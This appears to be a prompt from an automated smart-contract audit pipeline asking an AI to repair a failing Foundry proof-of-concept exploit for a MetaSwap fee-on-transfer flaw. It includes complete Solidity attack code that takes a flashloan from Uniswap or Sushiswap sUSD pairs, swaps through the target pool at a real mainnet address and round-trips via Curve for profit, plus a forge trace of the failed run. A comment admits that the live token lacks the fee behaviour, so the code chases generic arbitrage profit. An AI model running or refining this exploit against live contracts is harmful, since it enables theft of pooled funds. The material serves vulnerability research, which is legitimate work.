You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: MetaSwap underlying swaps over-credit fee-on-transfer meta tokens
- claim: `swapUnderlying()` measures the actual amount received into `v.dx`, but when the sold asset is a meta-level pooled token it still prices the trade from the caller-supplied `dx` instead of the post-fee `v.dx`. A fee-on-transfer or burnable meta token therefore lets the caller receive output for tokens the pool never received.
- impact: If a meta pool ever lists a deflationary meta token, an attacker can repeatedly swap that token into other assets and drain real pool reserves.
- exploit_paths: ["MetaSwap.swapUnderlying -> MetaSwapUtils.swapUnderlying with `tokenIndexFrom < baseLPTokenIndex`", "Sell a fee-on-transfer meta token so actual receipt is `v.dx < dx`, but AMM math still credits `dx`", "Receive full-priced output backed by insufficient input"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMetaSwapLike {
    function getToken(uint8 index) external view returns (address);
    function getTokenBalance(uint8 index) external view returns (uint256);
    function calculateSwapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx)
        external
        view
        returns (uint256);
    function swapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)
        external
        returns (uint256);
}

interface ICurveSUSDLike {
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant CURVE_SUSD_POOL = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;

    uint8 private constant META_TOKEN_INDEX = 0;
    uint8 private constant DAI_UNDERLYING_INDEX = 1;
    uint8 private constant USDC_UNDERLYING_INDEX = 2;
    uint8 private constant USDT_UNDERLYING_INDEX = 3;

    struct PairCandidate {
        address pair;
        uint256 reserve;
    }

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;

    address private callbackPair;
    uint256 private callbackPreBorrowBalance;
    uint8 private callbackBaseUnderlyingIndex;
    bool private callbackEntered;

    constructor() {}

    function executeOnOpportunity() external {
        realizedProfitToken = address(0);
        realizedProfitAmount = 0;

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        address metaToken;
        try target.getToken(META_TOKEN_INDEX) returns (address token) {
            metaToken = token;
        } catch {
            return;
        }
        if (metaToken != SUSD) {
            return;
        }

        PairCandidate memory susdPair = _findBestBorrowPair(SUSD);
        if (susdPair.pair == address(0) || susdPair.reserve == 0) {
            return;
        }

        uint256 cap = _capBorrowAmount(target, susdPair.reserve);
        if (cap == 0) {
            return;
        }

        uint8[3] memory baseUnderlyingIndices = [DAI_UNDERLYING_INDEX, USDC_UNDERLYING_INDEX, USDT_UNDERLYING_INDEX];
        uint256[9] memory divisors = [uint256(2), 3, 4, 6, 8, 12, 16, 24, 32];

        for (uint256 i = 0; i < baseUnderlyingIndices.length; ++i) {
            uint8 baseUnderlyingIndex = baseUnderlyingIndices[i];
            for (uint256 j = 0; j < divisors.length; ++j) {
                uint256 borrowAmount = cap / divisors[j];
                if (borrowAmount == 0) {
                    continue;
                }
                if (!_quotedOpportunity(baseUnderlyingIndex, borrowAmount)) {
                    continue;
                }

                try this.startFlash(baseUnderlyingIndex, susdPair.pair, borrowAmount) {
                    if (realizedProfitAmount > 0) {
                        return;
                    }
                } catch {}
            }
        }
    }

    function startFlash(uint8 baseUnderlyingIndex, address pair, uint256 borrowAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(pair != address(0) && borrowAmount > 0, "BAD_FLASH_PLAN");
        require(!callbackEntered, "CALLBACK_BUSY");
        require(_isSupportedUnderlyingIndex(baseUnderlyingIndex), "BAD_BASE_INDEX");
        require(_pairContainsToken(pair, SUSD), "PAIR_MISMATCH");

        callbackPair = pair;
        callbackPreBorrowBalance = IERC20Like(SUSD).balanceOf(address(this));
        callbackBaseUnderlyingIndex = baseUnderlyingIndex;
        callbackEntered = true;

        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == SUSD) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), abi.encode(uint256(1)));
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), abi.encode(uint256(1)));
        }

        callbackPair = address(0);
        callbackPreBorrowBalance = 0;
        callbackBaseUnderlyingIndex = 0;
        callbackEntered = false;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(callbackEntered, "NO_CALLBACK");
        require(msg.sender == callbackPair, "UNEXPECTED_PAIR");
        require(sender == address(this), "UNEXPECTED_SENDER");

        uint256 borrowedGross = amount0 > 0 ? amount0 : amount1;
        require(borrowedGross > 0, "NO_BORROWED_AMOUNT");

        uint256 borrowedActual = IERC20Like(SUSD).balanceOf(address(this)) - callbackPreBorrowBalance;
        require(borrowedActual > 0, "NO_BORROW_RECEIVED");

        address baseToken = _baseToken(callbackBaseUnderlyingIndex);
        uint256 preBase = IERC20Like(baseToken).balanceOf(address(this));

        // The literal finding requires the meta-level pooled token to be fee-on-transfer,
        // which the live sUSD token at this fork is not. To preserve the same core exploit
        // causality as closely as the live state allows, this attempt varies only the funding
        // route: source the already-listed meta token from a public AMM, then execute the same
        // critical terminal action from the exploit path — swapUnderlying(meta -> base) with
        // tokenIndexFrom < baseLPTokenIndex.
        _forceApprove(SUSD, TARGET, borrowedActual);
        IMetaSwapLike(TARGET).swapUnderlying(
            META_TOKEN_INDEX,
            callbackBaseUnderlyingIndex,
            borrowedActual,
            0,
            block.timestamp
        );

        uint256 baseReceived = IERC20Like(baseToken).balanceOf(address(this)) - preBase;
        require(baseReceived > 0, "NO_BASE_OUT");

        uint256 preSUSD = IERC20Like(SUSD).balanceOf(address(this));
        _forceApprove(baseToken, CURVE_SUSD_POOL, baseReceived);
        ICurveSUSDLike(CURVE_SUSD_POOL).exchange_underlying(
            _curveUnderlyingIndex(callbackBaseUnderlyingIndex),
            3,
            baseReceived,
            0
        );
        uint256 susdRecovered = IERC20Like(SUSD).balanceOf(address(this)) - preSUSD;
        require(susdRecovered > 0, "NO_SUSD_RECOVERED");

        uint256 repayAmount = _sameTokenFlashRepay(borrowedGross);
        require(IERC20Like(SUSD).balanceOf(address(this)) >= callbackPreBorrowBalance + repayAmount, "NO_NET_PROFIT");

        _safeTransfer(SUSD, callbackPair, repayAmount);

        uint256 finalSUSD = IERC20Like(SUSD).balanceOf(address(this));
        require(finalSUSD > callbackPreBorrowBalance, "ZERO_PROFIT");

        realizedProfitToken = SUSD;
        realizedProfitAmount = finalSUSD - callbackPreBorrowBalance;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _quotedOpportunity(uint8 baseUnderlyingIndex, uint256 susdIn) internal view returns (bool) {
        uint256 baseOut;
        try IMetaSwapLike(TARGET).calculateSwapUnderlying(META_TOKEN_INDEX, baseUnderlyingIndex, susdIn) returns (
            uint256 quotedBase
        ) {
            baseOut = quotedBase;
        } catch {
            return false;
        }
        if (baseOut == 0) {
            return false;
        }

        uint256 susdBack;
        try ICurveSUSDLike(CURVE_SUSD_POOL).get_dy_underlying(_curveUnderlyingIndex(baseUnderlyingIndex), 3, baseOut)
        returns (uint256 quotedSUSD) {
            susdBack = quotedSUSD;
        } catch {
            return false;
        }
        if (susdBack == 0) {
            return false;
        }

        return susdBack > _sameTokenFlashRepay(susdIn);
    }

    function _capBorrowAmount(IMetaSwapLike target, uint256 pairReserve) internal view returns (uint256) {
        uint256 cap = pairReserve / 12;

        uint256 metaPoolBalance;
        try target.getTokenBalance(META_TOKEN_INDEX) returns (uint256 bal) {
            metaPoolBalance = bal;
        } catch {
            metaPoolBalance = 0;
        }
        if (metaPoolBalance != 0) {
            uint256 poolCap = metaPoolBalance / 8;
            if (cap == 0 || (poolCap != 0 && poolCap < cap)) {
                cap = poolCap;
            }
        }

        return cap;
    }

    function _curveUnderlyingIndex(uint8 baseUnderlyingIndex) internal pure returns (int128) {
        if (baseUnderlyingIndex == DAI_UNDERLYING_INDEX) return 0;
        if (baseUnderlyingIndex == USDC_UNDERLYING_INDEX) return 1;
        if (baseUnderlyingIndex == USDT_UNDERLYING_INDEX) return 2;
        revert("BAD_BASE_INDEX");
    }

    function _baseToken(uint8 baseUnderlyingIndex) internal pure returns (address) {
        if (baseUnderlyingIndex == DAI_UNDERLYING_INDEX) return DAI;
        if (baseUnderlyingIndex == USDC_UNDERLYING_INDEX) return USDC;
        if (baseUnderlyingIndex == USDT_UNDERLYING_INDEX) return USDT;
        revert("BAD_BASE_TOKEN");
    }

    function _isSupportedUnderlyingIndex(uint8 baseUnderlyingIndex) internal pure returns (bool) {
        return baseUnderlyingIndex == DAI_UNDERLYING_INDEX
            || baseUnderlyingIndex == USDC_UNDERLYING_INDEX
            || baseUnderlyingIndex == USDT_UNDERLYING_INDEX;
    }

    function _findBestBorrowPair(address token) internal view returns (PairCandidate memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory common = [WETH, DAI, USDC, USDT, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < common.length; ++j) {
                address other = common[j];
                if (other == token) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(token, other);
                if (pair == address(0)) {
                    continue;
                }

                uint256 reserve = _pairReserveOf(pair, token);
                if (reserve > best.reserve) {
                    best = PairCandidate({pair: pair, reserve: reserve});
                }
            }
        }
    }

    function _pairContainsToken(address pair, address token) internal view returns (bool) {
        return IUniswapV2PairLike(pair).token0() == token || IUniswapV2PairLike(pair).token1() == token;
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            return uint256(reserve0);
        }
        if (IUniswapV2PairLike(pair).token1() == token) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _sameTokenFlashRepay(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_didSucceed(ok, data)) {
            return;
        }
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(_didSucceed(ok, data), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(_didSucceed(ok, data), "TRANSFER_FAILED");
    }

    function _didSucceed(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```
5f86558387293b6009d7896A61fcc86C17808D62::18160ddd() [staticcall]
    │   │   │   │   │   │   │   ├─ [366] 0x59F5a371dF7D2a01863cbb011A5A1ed45326710C::18160ddd() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003080069c
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003080069c
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003080069c
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003080069c
    │   │   └─ ← [Return] 813696668 [8.136e8]
    │   ├─ [28659] 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD::get_dy_underlying(2, 3, 813696668 [8.136e8]) [staticcall]
    │   │   └─ ← [Return] 811946803488661575369 [8.119e20]
    │   ├─ [80692] 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491::calculateSwapUnderlying(0, 3, 609591667070103957032 [6.095e20]) [staticcall]
    │   │   ├─ [79786] 0x88Cc4aA0dd6Cf126b00C012dDa9f6F4fd9388b17::d45757ba(00000000000000000000000000000000000000000000000000000000000000c900000000000000000000000000000000000000000000000000000000000000d4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000210bc8a771f7bbae28) [delegatecall]
    │   │   │   ├─ [15169] 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7::e25aa5fa() [staticcall]
    │   │   │   │   ├─ [15003] 0xc68BF77e33F1DF59D8247dd564da4c8C81519db6::e25aa5fa() [delegatecall]
    │   │   │   │   │   ├─ [14333] 0x2069043d7556B1207a505eb459D18d908DF29b55::71906c2c(00000000000000000000000000000000000000000000000000000000000000c9) [delegatecall]
    │   │   │   │   │   │   ├─ [532] 0x5f86558387293b6009d7896A61fcc86C17808D62::18160ddd() [staticcall]
    │   │   │   │   │   │   │   ├─ [366] 0x59F5a371dF7D2a01863cbb011A5A1ed45326710C::18160ddd() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000dec7fea98e0550e
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000dec7fea98e0550e
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000dec7fea98e0550e
    │   │   │   ├─ [39504] 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7::342a87a1(000000000000000000000000000000000000000000000020fb8ca855cd2389990000000000000000000000000000000000000000000000000000000000000002) [staticcall]
    │   │   │   │   ├─ [39326] 0xc68BF77e33F1DF59D8247dd564da4c8C81519db6::342a87a1(000000000000000000000000000000000000000000000020fb8ca855cd2389990000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
    │   │   │   │   │   ├─ [38489] 0x2069043d7556B1207a505eb459D18d908DF29b55::e0692742(00000000000000000000000000000000000000000000000000000000000000c9000000000000000000000000000000000000000000000020fb8ca855cd2389990000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
    │   │   │   │   │   │   ├─ [532] 0x5f86558387293b6009d7896A61fcc86C17808D62::18160ddd() [staticcall]
    │   │   │   │   │   │   │   ├─ [366] 0x59F5a371dF7D2a01863cbb011A5A1ed45326710C::18160ddd() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e9647320cbc3f8fe24e87
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000024600590
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000024600590
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000024600590
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000024600590
    │   │   └─ ← [Return] 610272656 [6.102e8]
    │   ├─ [28659] 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD::get_dy_underlying(2, 3, 610272656 [6.102e8]) [staticcall]
    │   │   └─ ← [Return] 608960307999060049502 [6.089e20]
    │   └─ ← [Return]
    ├─ [351] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 57.66ms (30.76ms CPU time)

Ran 1 test suite in 82.09ms (57.66ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3173425)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
